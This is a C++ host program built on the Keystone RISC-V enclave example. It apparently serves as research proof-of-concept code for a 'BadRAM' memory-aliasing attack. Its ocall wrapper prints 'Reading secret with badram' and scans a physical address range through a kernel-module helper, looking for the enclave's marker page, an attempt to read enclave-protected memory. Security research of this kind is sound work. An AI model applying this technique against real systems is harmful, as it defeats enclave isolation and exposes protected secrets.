//******************************************************************************
// Copyright (c) 2018, The Regents of the University of California (Regents).
// All Rights Reserved. See LICENSE for license details.
//------------------------------------------------------------------------------
#include <cstdio>
#include <edge_call.h>
#include <keystone.h>
#include <stdbool.h>
#include <string.h>

extern "C" {
#include "/home/alouka/Documents/repos/badram-riscv/alias-reversing/modules/read_alias/include/readalias.h"
#include "/home/alouka/Documents/repos/badram-riscv/alias-reversing/modules/read_alias/readalias.c"
}
unsigned long print_string(char *str);
void print_string_wrapper(void *buffer);
#define OCALL_PRINT_STRING 1

char __attribute__((aligned(0x1000))) test_buff[0x1000];
/***
 * An example call that will be exposed to the enclave application as
 * an "ocall". This is performed by an edge_wrapper function (below,
 * print_string_wrapper) and by registering that wrapper with the
 * enclave object (below, main).
 ***/
unsigned long print_string(char *str) {
  return printf("Enclave said: \"%s\"\n", str);
}

int main(int argc, char **argv) {
  open_kmod();
  Keystone::Enclave enclave;
  Keystone::Params params;

  params.setFreeMemSize(1024 * 1024);
  params.setUntrustedSize(1024 * 1024);

  enclave.init(argv[1], argv[2], argv[3], params);

  enclave.registerOcallDispatch(incoming_call_dispatch);

  /* We must specifically register functions we want to export to the
     enclave. */
  register_call(OCALL_PRINT_STRING, print_string_wrapper);

  edge_call_init_internals((uintptr_t)enclave.getSharedBuffer(),
                           enclave.getSharedBufferSize());

  enclave.run();
  return 0;
}

/***
 * Example edge-wrapper function. These are currently hand-written
 * wrappers, but will have autogeneration tools in the future.
 ***/
void print_string_wrapper(void *buffer) {
  /* Parse and validate the incoming call data */
  struct edge_call *edge_call = (struct edge_call *)buffer;
  uintptr_t call_args;
  unsigned long ret_val;
  size_t arg_len;
  if (edge_call_args_ptr(edge_call, &call_args, &arg_len) != 0) {
    edge_call->return_data.call_status = CALL_STATUS_BAD_OFFSET;
    return;
  }

  /* Pass the arguments from the eapp to the exported ocall function */
  //  ret_val = print_string((char *)call_args);
  printf("Buffer pointer: %p\n", buffer);

  /* Setup return data from the ocall function */
  uintptr_t data_section = edge_call_data_ptr();
  memcpy((void *)data_section, &ret_val, sizeof(unsigned long));
  if (edge_call_setup_ret(edge_call, (void *)data_section,
                          sizeof(unsigned long))) {
    edge_call->return_data.call_status = CALL_STATUS_BAD_PTR;
  } else {
    edge_call->return_data.call_status = CALL_STATUS_OK;
  }

  printf("Reading secret with badram\n");

  char buf[4096] = {0};
  page_stats_t stats;

  memset(test_buff, 'A', 0x1000);
  for (uint64_t j = 0x200000000; j < 0x1000000000; j += 4096) {
    if (memcpy_frompa(buf, j, 4096, &stats, true) != 0) {
      printf("Error\n");
      return;
    }
    if (memcmp(buf, test_buff, 0x1000) == 0)
      printf("\nBuffer at j: [%llx]\n", j);
    // else if (!(j % (10 % 4096)))
    //  printf(".");
    // for (int i = 0; i < 4096; i++) {
    //   if (buf[i] == 'A')
    //     printf("%02x [%p]", buf[i], j);
    // }

    // printf("\n");
  }
  /* This will now eventually return control to the enclave */
  return;
}
